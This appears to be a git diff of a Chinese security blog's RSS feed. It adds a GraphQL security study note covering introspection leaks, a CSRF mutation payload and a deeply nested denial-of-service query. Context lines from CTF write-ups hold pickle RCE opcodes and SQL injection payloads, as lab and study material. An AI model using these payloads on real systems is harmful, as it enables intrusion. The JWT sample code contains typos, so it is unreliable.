@@ -1,4 +1,308 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/posts/</link><description>Recent content in Posts on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 18 Aug 2021 17:07:55 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>RACTF2021 Wp</title><link>https://amiaaaz.github.io/2021/08/18/ractf2021-wp/</link><pubDate>Wed, 18 Aug 2021 17:07:55 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/18/ractf2021-wp/</guid><description>&lt;p>&lt;a href="https://2021.ractf.co.uk/">https://2021.ractf.co.uk/&lt;/a>&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/posts/</link><description>Recent content in Posts on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Fri, 03 Sep 2021 20:56:54 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>GraphQL学习笔记</title><link>https://amiaaaz.github.io/2021/09/03/graphql-study-notes/</link><pubDate>Fri, 03 Sep 2021 20:56:54 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/03/graphql-study-notes/</guid><description>&lt;h2 id="graphql简述">GraphQL简述&lt;/h2>
+&lt;p>GraphQL是一种针对Graph（图状数据）查询很有优势的Query Language（查询语言），而涉及到存储时可以选择NoSQL, SQL或其它任意存储方式（例如文本文件、存内存里等）；这是一门便于前后端交互的语言，而不是便于后端和数据库交互的语言。&lt;/p>
+&lt;p>应用GraphQL的一个很重要的前提是后端数据已经以图的结构进行保存，（并且一定情况下已经设置好基于隐私的访问控制 授权与鉴权，否则会直接被攻击者执行高危操作）。每次查询或更新都有自己的根节点，得到的数据是树状结构；如果希望以图的形式展示则前端不能简单的对其进行缓存，那必须使用相应的存储数据库，通过顶点的ID把不同节点之间的某些边重新连接起来。&lt;/p>
+&lt;p>并不是所有场景都需要迁移到GraphQL，如果RESTful API已经能满足需求的话。&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;a href="https://twitter.com/jlouis666/status/1018140132153667584">GraphQL is basically just sugar for a simply typed lambda calculus.&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="变更---mutations">变更 - Mutations&lt;/h3>
+&lt;blockquote>
+&lt;p>&lt;a href="https://medium.com/@HurricaneJames/graphql-mutations-fb3ad5ae73c4">three important things:&lt;/a>&lt;/p>
+&lt;p>mutations are just queries in different namespace, but do NOT mix them;&lt;/p>
+&lt;p>arguments require Input Objects, not normal Objects;&lt;/p>
+&lt;p>use xyzAttributes for anything you want to link, then let your backend sort out how to do the linking(just like any other system we currently use)&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="内省---introspection">内省 - introspection&lt;/h3>
+&lt;p>GraphQL 允许在查询的任何位置请求 &lt;code>__typename&lt;/code>，一个元字段(Meta fields)，以获得那个位置的对象类型名称。&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902180824151.png" alt="image-20210902180824151">&lt;/p>
+&lt;p>我们也可以通过查询 &lt;code>__schema&lt;/code> 字段来向 GraphQL 询问哪些类型是可用的，类型有以下这些：&lt;/p>
+&lt;ul>
+&lt;li>Query, Character, Human, Episode, Droid - 这些是我们在类型系统中定义的类型。&lt;/li>
+&lt;li>String, Boolean - 这些是内建的标量，由类型系统提供。&lt;/li>
+&lt;li>&lt;code>__Schema&lt;/code>, &lt;code>__Type&lt;/code>, &lt;code>__TypeKind&lt;/code>, &lt;code>__Field&lt;/code>, &lt;code>__InputValue&lt;/code>, &lt;code>__EnumValue&lt;/code>, &lt;code>__Directive&lt;/code> - 这些有着两个下划线的类型是内省系统的一部分。&lt;/li>
+&lt;/ul>
+&lt;h2 id="敏感信息泄露越权">敏感信息泄露&amp;amp;越权&lt;/h2>
+&lt;p>自动文档生成/解析 - &lt;a href="https://github.com/2fd/graphdoc">graphdoc&lt;/a> | &lt;a href="https://github.com/graphql/graphql-playground">graphql-playground&lt;/a> | &lt;a href="https://apis.guru/graphql-voyager/">graphql-voyager&lt;/a> &amp;hellip;&amp;hellip;&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902183558042.png" alt="image-20210902183558042">&lt;/p>
+&lt;p>由于对对象或属性的权限控制不完善，导致信息泄露，案例：&lt;a href="https://hackerone.com/reports/310946">hackerone 一系列信息泄露漏洞&lt;/a>&lt;/p>
+&lt;p>在objects.types中寻找敏感信息，如email, password, secretkey, token, licensekey, session等，多多关注废弃字段（deprecated fields)。当字段被废弃后直接用&lt;code>__type&lt;/code>做内省确实查找不到，但当指定&lt;code>includeDreprecated: true&lt;/code>时，&lt;code>__type&lt;/code>仍然可以将废弃字段暴露出来。&lt;/p>
+&lt;h2 id="graphql的认证方式">GraphQL的认证方式&lt;/h2>
+&lt;p>GraphQL并没有规定任何身份认证和权限控制的相关内容，因此我们可以更灵活的在应用中实现各种粒度的认证和权限；但是也很容易写出一些“裸奔”的接口或无效认证无效的接口。&lt;/p>
+&lt;h3 id="独立认证终端-restful">独立认证终端 (RESTful)&lt;/h3>
+&lt;p>通用且官方推荐的方式，如果后端本身支持RESTful或有专门的认证服务器，可以修改少量代码实现GraphQL接口的认证。&lt;/p>
+&lt;p>举例：添加jwt认证&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902200434456.png" alt="image-20210902200434456">&lt;/p>
+&lt;h3 id="在graphql内认证">在GraphQL内认证&lt;/h3>
+&lt;p>如果GraphQL的后端支持GraphQL不能支持RESTful，或全部请求都需要使用GraphQL，也可以用构造相关的Query Schema接口返回token的形式。&lt;/p>
+&lt;p>举例：构造login的Query Schema，在返回值中携带token&lt;/p>
+&lt;pre tabindex="0">&lt;code>type Query{
+login(
+username: String!
+password: String!
+): LoginMsg
+type LoginMsg{
+message: String
+token: String
+}
+}
+&lt;/code>&lt;/pre>&lt;p>在resolver中提供登录逻辑&lt;/p>
+&lt;pre tabindex="0">&lt;code>import bcrypt from 'bcrptjs';
+import jsonwebtoken from 'jsonwebtoken';
+export const login = async(_, args, context) =&amp;gt; {
+const db = await context.getDb();
+const{username, password} = args;
+const user = await db.collection('User').findOne({username: username});
+if(await bcyrpt.compare(password, user.password)){
+return{
+message: 'Login success',
+token: jsonwebtoken.sign({
+user: user,
+exp: Math.floor(Date.now() / 1000) + (60 * 60),
+}, 'your secret'),
+};
+}
+}
+&lt;/code>&lt;/pre>&lt;p>登录成功后 我们把token设置在请求头中，继续请求GraphQL的其他接口，这时需要对ApolloServer进行如下配置&lt;/p>
+&lt;pre tabindex="0">&lt;code>const server = new ApolloServer({
+typeDefs: schemaText,
+resolvers: resolverMap,
+context: ({ ctx }) =&amp;gt; {
+const token = ctx.req.headers.authorization || '';
+const user = getUser(token);
+return{
+...user,
+...ctx,
+...app.context
+};
+},
+});
+&lt;/code>&lt;/pre>&lt;p>实现getUser函数&lt;/p>
+&lt;pre tabindex="0">&lt;code>const getUser = (token) =&amp;gt; {
+let user = null;
+const parts = token.split(' ');
+if(parts.length === 2){
+const scheme = parts[0];
+const credentials = parts[1];
+if(/^Bearer$/i.test(scheme)){
+token = credentials;
+try{
+user = jwt.verify(token, JWT_SECRET);
+console.log(user);
+}catch(e){
+console.log(e);
+}
+}
+}
+return user
+}
+&lt;/code>&lt;/pre>&lt;p>配置好ApolloServer后，在resolver中校验user&lt;/p>
+&lt;pre tabindex="0">&lt;code>import {ApolloError, ForbiddenError, AuthenticationError} from 'apollo-server';
+export const blogs = async(_, args, context) =&amp;gt; {
+const db = await context.getDb();
+const user = context.user;
+if(!user){
+throw new AuthenticationError('You must be logged in to see blogs');
+}
+const {blogId} = args;
+const cursor = {}；
+if(blogId){
+cursor['_id'] = blogId;
+}
+const blogs = await db
+.collection('blogs')
+.find(cursor)
+.sort({publishedAt: -1})
+.toArray();
+return blogs;
+}
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902203603699.png" alt="image-20210902203603699">&lt;/p>
+&lt;h2 id="更多安全漏洞">更多安全漏洞&lt;/h2>
+&lt;p>Express-GraphQL：&lt;/p>
+&lt;ul>
+&lt;li>框架默认无防护&lt;/li>
+&lt;li>自带GraphiQL&lt;/li>
+&lt;/ul>
+&lt;p>Graphene-Django：&lt;/p>
+&lt;ul>
+&lt;li>依赖Django的安全配置（Secure As Default）&lt;/li>
+&lt;li>自带GraphiQL&lt;/li>
+&lt;/ul>
+&lt;p>GraphQL-PHP&lt;/p>
+&lt;ul>
+&lt;li>无关框架&lt;/li>
+&lt;/ul>
+&lt;h3 id="express-graphql-endpoint-csrf漏洞">Express-GraphQL Endpoint CSRF漏洞&lt;/h3>
+&lt;pre tabindex="0">&lt;code>{&amp;quot;query&amp;quot;:&amp;quot;mutation {\n editProfile(name:\&amp;quot;hacker\&amp;quot;, age: 5) {\n name\n age\n }\n}&amp;quot;,&amp;quot;variables&amp;quot;:null}
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902205831949.png" alt="image-20210902205831949">&lt;/p>
+&lt;p>将Content-Type修改为application/x-www-form-urlencode，仍可成功执行&lt;/p>
+&lt;pre tabindex="0">&lt;code>query=mutation%20%7B%0A%20%20editProfile(name%3A%22hacker%22%2C%20age%3A%20
+5)%20%7B%0A%20%20%20%20name%0A%20%20%20%20age%0A%20%20%7D%0A%7D
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902210011480.png" alt="image-20210902210011480">&lt;/p>
+&lt;p>直接配合burp自带的Generate CSRD POC&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902210221214.png" alt="image-20210902210221214">&lt;/p>
+&lt;h3 id="graphiql-clickjacking-漏洞">GraphiQL Clickjacking 漏洞&lt;/h3>
+&lt;p>参见：https://github.com/graphql/graphiql/issues/683&lt;/p>
+&lt;p>可以配合burp自带的Clickbandit进行攻击&lt;/p>
+&lt;h3 id="graphql-injection-漏洞">GraphQL injection 漏洞&lt;/h3>
+&lt;p>&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection">这是一个相当全的payloads&amp;amp;exps&lt;/a> | &lt;a href="https://gist.github.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da">这是一个自省payload&lt;/a>&lt;/p>
+&lt;p>p神ppt里的示意图直接搬过来了&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902211535481.png" alt="image-20210902211535481">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902211551814.png" alt="image-20210902211551814">&lt;/p>
+&lt;p>仍然是拼接了恶意的GraphQL语句导致漏洞的发生，本质还是对用户输入的控制不严格；同类的漏洞还有xss, rce等等&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;a href="https://www.freebuf.com/articles/web/184040.html">有语法就有解析，有解析就会有结构和顺序，有结构和顺序就会有注入。&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>用“参数化查询”的方式来解决上述问题时，要确保后端的解析引擎没有大病&lt;/p>
+&lt;h3 id="通过custom-scalar的注入-json">通过Custom Scalar的注入 (JSON)&lt;/h3>
+&lt;blockquote>
+&lt;p>&lt;a href="http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/">NoSQL Injection is entirely possible when using GraphQL, and can creep into your application through the use of &amp;lsquo;custom scalar types&amp;rsquo;&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>————更多的GraphQLi相关问题可参见&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection">这个git仓库&lt;/a>，一本满足（&lt;/p>
+&lt;h3 id="拒绝服务">拒绝服务&lt;/h3>
+&lt;p>GraphQL中的query和mutation的返回结果都是可以有嵌套的对象的，如果不对嵌套深度进行限制，有可能被利用从而进行拒绝服务攻击。&lt;/p>
+&lt;p>一个举例：&lt;/p>
+&lt;p>定义了Blog和Author:&lt;/p>
+&lt;pre tabindex="0">&lt;code>type Blog{
+_id: String!
+type: BlogType
+avatar: String
+title: String
+content: [String]
+author: Author
+....
+}
+type Author{
+_id: String!
+name: String
+blog: [Blog]
+}
+&lt;/code>&lt;/pre>&lt;p>都有各自的Query:&lt;/p>
+&lt;pre tabindex="0">&lt;code>extend type Query{
+blogs(
+blogId: ID
+systemType: String!
+): [Blog]
+}
+extend type Query{
+author(
+_id: String
+): Author
+}
+&lt;/code>&lt;/pre>&lt;p>我们可以构造这样的查询，无限套娃导致dos&lt;/p>
+&lt;pre tabindex="0">&lt;code>query GetBlogs($blogId: ID, $systemType: String!) {
+blogs(blogId: $blogId, systemType: $systemType) {
+_id
+title
+type
+content
+author {
+name
+blog {
+author {
+name
+blog {
+author {
+name
+blog {
+author {
+name
+blog {
+author {
+name
+blog {
+author {
+name
+blog {
+author {
+name
+blog {
+author {
+name
+# and so on...
+}
+}
+}
+}
+}
+}
+}
+}
+}
+}
+}
+}
+}
+title
+createdAt
+publishedAt
+}
+}
+publishedAt
+}
+}
+&lt;/code>&lt;/pre>&lt;p>解决这个问题我们需要在GraphQL服务器上限制查询深度，同时设计GraphQL接口时尽量避免出现此类问题，以Node.js为例，graphql-depth-limit就可以解决这样的问题&lt;/p>
+&lt;pre tabindex="0">&lt;code>// ...
+import depthLimit from 'graphql-depth-limit';
+// ...
+const server = new ApolloServer({
+typeDefs: schemaText,
+resolvers: resolverMap,
+context: ({ ctx }) =&amp;gt; {
+const token = ctx.req.headers.authorization || '';
+const user = getUser(token);
+console.log('user', user)
+return{
+...user,
+...ctx,
+...app.context
+};
+},
+validationRules: [ depthLimit(10) ]
+});
+// ...
+&lt;/code>&lt;/pre>&lt;h3 id="graphene-django-debug模式下的安全问题">Graphene-Django DEBUG模式下的安全问题&lt;/h3>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210903201318096.png" alt="image-20210903201318096">&lt;/p>
+&lt;h2 id="在ctf中的表现">在CTF中的表现&lt;/h2>
+&lt;p>&lt;a href="https://tsublogs.wordpress.com/2017/08/25/hitb-ctf-singapore-2017-web-512-blog/">[HITB CTF Singapore 2017]Blog&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://godot.win/2017/GraphQl/#SEC-T-2017-Dark-Market">[SECT 2017]Dark Market&lt;/a> | &lt;a href="https://github.com/reznok/CTFWriteUps/tree/master/SEC-T_2017/DarkMarket">wp2&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://swisskyrepo.github.io/HIP19-MeetYourDoctor/">[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3&lt;/a> | &lt;a href="https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/">wp2&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.gem-love.com/ctf/2198.html">[VolgaCTF 2020]Library&lt;/a>&lt;/p>
+&lt;p>[corCTF 2021]devme&lt;/p>
+&lt;h2 id="结尾">结尾&lt;/h2>
+&lt;p>&lt;a href="https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application">Damn Vulnerable GraphQL Application&lt;/a>-&amp;gt; 一个漏洞复现的靶场，包含了上面提到和没提到的GraphQL存在的洞&lt;/p>
+&lt;pre tabindex="0">&lt;code>docker pull dolevf/dvga
+docker run -d -p 5000:5000 -e WEB_HOST=0.0.0.0 dolevf/dvga
+&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210903203245165.png" alt="image-20210903203245165">&lt;/p>
+&lt;p>已经有&lt;a href="https://mp.weixin.qq.com/s/WoHEC50u7KACLLafZL5tww">写好的wp&lt;/a>了 不向互联网产出湿垃圾 从我做起&lt;/p>
+&lt;hr>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+以下是本文中涉及到的 和我学习时看过的所有文章的链接 每日感谢互联网的丰富资源（
+&lt;/h4>
+&lt;/summary>
+&lt;p>&lt;a href="https://graphql.cn/">中文官网&lt;/a>&lt;/p>
+&lt;p>&lt;a href="http://graphqlapp.herokuapp.com/">在线GraphiQL&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://github.com/zhouyuexie/learn-graphql">learn-graphql&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.zhihu.com/question/264629587">什么是 GraphQL？&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.secpulse.com/archives/148242.html">玩转graphQL&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://juejin.cn/post/6844903795407716366">GraphQL 从入门到实践&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://juejin.cn/post/6844903841813495822">【CuteJavaScript】GraphQL真香入门教程&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://xzfile.aliyuncs.com/upload/zcon/2018/7_%E6%94%BB%E5%87%BBGraphQL_phithon.pdf">攻击GraphQL&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.freebuf.com/articles/web/184040.html">GraphQL安全指北&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.shuzhiduo.com/A/RnJW3BRoJq/">UWP GraphQL数据查询的实现&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://medium.com/@HurricaneJames/graphql-mutations-fb3ad5ae73c4">GraphQL Mutations&lt;/a>&lt;/p>
+&lt;p>&lt;a href="http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/">GraphQL NoSQL Injection Through JSON Types&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://godot.win/2017/GraphQl/">GraphQL Injection&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://mp.weixin.qq.com/s/WoHEC50u7KACLLafZL5tww">【安全记录】玩转GraphQL - DVGA靶场（上）&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://mp.weixin.qq.com/s/mmJrE6uIBC-4ztr5PFZasA">【安全记录】玩转GraphQL - DVGA靶场（下）&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://tsublogs.wordpress.com/2017/08/25/hitb-ctf-singapore-2017-web-512-blog/">[HITB CTF Singapore 2017]Blog&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://godot.win/2017/GraphQl/#SEC-T-2017-Dark-Market">[SECT 2017]Dark Market&lt;/a> | &lt;a href="https://github.com/reznok/CTFWriteUps/tree/master/SEC-T_2017/DarkMarket">wp2&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://swisskyrepo.github.io/HIP19-MeetYourDoctor/">[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3&lt;/a> | &lt;a href="https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/">wp2&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://www.gem-love.com/ctf/2198.html">[VolgaCTF 2020]Library&lt;/a>&lt;/p>
+&lt;/details>
+&lt;hr>
+&lt;p>开学了，不摆烂从我做起&lt;/p></description></item><item><title>RACTF2021 Wp</title><link>https://amiaaaz.github.io/2021/08/18/ractf2021-wp/</link><pubDate>Wed, 18 Aug 2021 17:07:55 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/18/ractf2021-wp/</guid><description>&lt;p>&lt;a href="https://2021.ractf.co.uk/">https://2021.ractf.co.uk/&lt;/a>&lt;/p>
 &lt;p>&lt;a href="https://github.com/ractf/challenges/tree/master/2021">https://github.com/ractf/challenges/tree/master/2021&lt;/a>&lt;/p>
 &lt;p>&lt;a href="https://github.com/404dcd/RACTF-challenges">https://github.com/404dcd/RACTF-challenges&lt;/a>&lt;/p>
 &lt;p>&lt;a href="https://blog.ractf.co.uk/tag/ractf-2021/">https://blog.ractf.co.uk/tag/ractf-2021/&lt;/a>&lt;/p>
@@ -11,14 +315,14 @@
 &lt;p>但是版本也太新了吧8.1.1，弱口令也没有，抓包可以看到它在不停的请求各种api，其中有个/api/ds/query，以明文方式请求数据库内容&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818005705121.png" alt="image-20210818005705121">&lt;/p>
 &lt;p>那这就好说了，直接明牌了都&lt;/p>
-&lt;pre>&lt;code>SELECT name FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%';
+&lt;pre tabindex="0">&lt;code>SELECT name FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%';
 SELECT * FROM flags;
 &lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818011913101.png" alt="image-20210818011913101">&lt;/p>
 &lt;p>————这个故事告诉我们对于权限的设置是很重要的，不要随便把api接口暴露出来，也不要明文传递信息&lt;/p>
 &lt;h2 id="webreally-awesome-hidden-service">Web/Really Awesome Hidden Service&lt;/h2>
 &lt;blockquote>
 &lt;p>Ahoy, matey! Some dirty scallywags seem to not be respectin' th' pirate code! Teach them a lesson by findin' out who they be.&lt;/p>
-&lt;pre>&lt;code>ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion
+&lt;pre tabindex="0">&lt;code>ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion
 &lt;/code>&lt;/pre>&lt;/blockquote>
 &lt;p>一个Tor的网站，走匿名方式&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818014430572.png" alt="image-20210818014430572">&lt;/p>
@@ -883,7 +1187,7 @@ df8238034568781a5df3098ed46435fee0df6c807938e7dbeccb0a29f887d246 xal
 &lt;p>但是这个sys模块并不安全：sys模块有一个字典对象sys.modules，它包含了运行时所有py程序所引入的所有模块(a cache of imported modules) ，如果它被改变 引入的模块就会被改变。而它也包括sys本身，也就是套娃&lt;code>sys.modules['sys']=sys.modules&lt;/code>。那么如果我们先从sys中引入modules: &lt;code>import modules from sys&lt;/code>，然后将&lt;code>modules['sys']&lt;/code>改为&lt;code>modules['os']&lt;/code>就将成功引入os模块。&lt;/p>
 &lt;p>但有个缺陷是modules为dict，需要用&lt;code>getattr(sys.modules[module], name)&lt;/code>进行取值，也就是先取出modules中的get函数，然后再用get来取出os，再进行替换修改&lt;/p>
 &lt;p>pker&lt;/p>
-&lt;pre>&lt;code>modules=GLOBAL('sys', 'modules')
+&lt;pre tabindex="0">&lt;code>modules=GLOBAL('sys', 'modules')
 modules['sys']=modules
 modules_get=GLOBAL('sys', 'get')
 os=modules_get('os')
@@ -892,7 +1196,7 @@ system=GLOBAL('sys', 'system')
 system('dir')
 return
 &lt;/code>&lt;/pre>&lt;p>opcode:&lt;/p>
-&lt;pre>&lt;code>b&amp;quot;csys\nmodules\np0\n0g0\nS'sys'\ng0\nscsys\nget\np2\n0g2\n(S'os'\ntRp3\n0g0\nS'sys'\ng3\nscsys\nsystem\np5\n0g5\n(S'dir'\ntR.&amp;quot;
+&lt;pre tabindex="0">&lt;code>b&amp;quot;csys\nmodules\np0\n0g0\nS'sys'\ng0\nscsys\nget\np2\n0g2\n(S'os'\ntRp3\n0g0\nS'sys'\ng3\nscsys\nsystem\np5\n0g5\n(S'dir'\ntR.&amp;quot;
 &lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811215300764.png" alt="image-20210811215300764">&lt;/p>
 &lt;/details>
 &lt;h3 id="--仅可以引入题目中自设空模块">&amp;ndash;&amp;raquo;仅可以引入题目中自设空模块&lt;/h3>
@@ -923,7 +1227,7 @@ return
 &lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pickle.sys.modules[&amp;#39;&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#d88200">&amp;#39;].system(&amp;#39;&lt;/span>&lt;span style="color:#111">cat&lt;/span> &lt;span style="color:#f92672">../&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">txt&lt;/span>&lt;span style="color:#d88200">&amp;#39;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
 &lt;span style="color:#00a8c8">return&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>opcode&lt;/p>
-&lt;pre>&lt;code>b&amp;quot;cstructs\n__dict__\np0\n0cstructs\n__builtins__\np1\n0cstructs\n__getattribute__\np2\n0g1\nS'__import__'\ng2\nsg0\nS'structs'\ng1\nscstructs\nget\np5\n0g5\n(S'eval'\ntRp6\n0g6\n(S'pickle.sys.modules['os'].system('cat ../flag.txt')'\ntR.&amp;quot;
+&lt;pre tabindex="0">&lt;code>b&amp;quot;cstructs\n__dict__\np0\n0cstructs\n__builtins__\np1\n0cstructs\n__getattribute__\np2\n0g1\nS'__import__'\ng2\nsg0\nS'structs'\ng1\nscstructs\nget\np5\n0g5\n(S'eval'\ntRp6\n0g6\n(S'pickle.sys.modules['os'].system('cat ../flag.txt')'\ntR.&amp;quot;
 &lt;/code>&lt;/pre>&lt;/details>
 &lt;h3 id="禁止br操作码">禁止&lt;code>b'R'&lt;/code>操作码&lt;/h3>
 &lt;p>也就相当于不可以用&lt;code>__reduce__&lt;/code>，有以下几种应对方法（以下方法同样可以单独使用鸭！！！），变量覆盖（无直接代码执行）或利用&lt;code>b'i'&lt;/code>，&lt;code>b'i'&lt;/code>，&lt;code>b'b'&lt;/code>这些操作码来rce。&lt;/p>
@@ -1290,7 +1594,7 @@ return
 &lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">privileged&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>
 &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">user&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>opcode&lt;/p>
-&lt;pre>&lt;code>b&amp;quot;cstructs\nUser\np0\n0g0\n(}(S'__set__'\ncstructs\nUser\ndtbg0\n(I0\nI0\ntRp2\n0g0\n(}(S'privileged'\ng2\ndtbg2\n.&amp;quot;
+&lt;pre tabindex="0">&lt;code>b&amp;quot;cstructs\nUser\np0\n0g0\n(}(S'__set__'\ncstructs\nUser\ndtbg0\n(I0\nI0\ntRp2\n0g0\n(}(S'privileged'\ng2\ndtbg2\n.&amp;quot;
 &lt;/code>&lt;/pre>&lt;/details>
 &lt;p>考虑到这个题更综合了python的相关特性，所以把这个题放在最后。&lt;/p>
 &lt;hr>
@@ -1425,7 +1729,7 @@ return
 &lt;p>emmmm 但是这里不管是明文还是url encode都会有500错误，而且这里返回的时&lt;code>correct_password[0][0]==password&lt;/code>，也算是杜绝了这种多添加一条信息的可能，之前已经初始化的密码会是&lt;code>[0][0]&lt;/code>，而新插入的passwd将是&lt;code>[1][0]&lt;/code>；并且在&lt;code>init()&lt;/code>时定义username是primary 也不可能有重复的&lt;/p>
 &lt;p>————比赛的时候就停到这里了，也是当时了解的太少，思路很容易就断掉了。。。以下是复现&lt;/p>
 &lt;p>在看了&lt;a href="https://github.com/Muirey03/redpwn2021_writeups/blob/master/web_cool.md">这篇wp&lt;/a>之后，发现这位师傅最开始跟我的思路是一样的 都想利用insert那一句，都想替换掉数据库中原来存有的ginkoid的密码；这位师傅用的payload是&lt;/p>
-&lt;pre>&lt;code>'),('ginkoid','') ON CONFLICT DO UPDATE SET password='';--
+&lt;pre tabindex="0">&lt;code>'),('ginkoid','') ON CONFLICT DO UPDATE SET password='';--
 &lt;/code>&lt;/pre>&lt;p>其中的&lt;code>ON CONFLICT DO UPDATE SET&lt;/code>，在&lt;a href="https://www.sqlite.org/lang_UPSERT.html">这篇官方文档&lt;/a>里写的很详细，这位师傅给的payload很好（我当时则对这个sql语句并不清楚）但是正如他所说的，which is 8 characters over the limit, which won&amp;rsquo;t do.&lt;/p>
 &lt;p>最后使用盲注的方式，先上一下脚本 （&lt;a href="https://github.com/SuperStormer/writeups/blob/master/redpwnctf_2021/web/cool.py">这里是来源&lt;/a>）再说说思路&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">time&lt;/span>
@@ -1529,7 +1833,7 @@ return
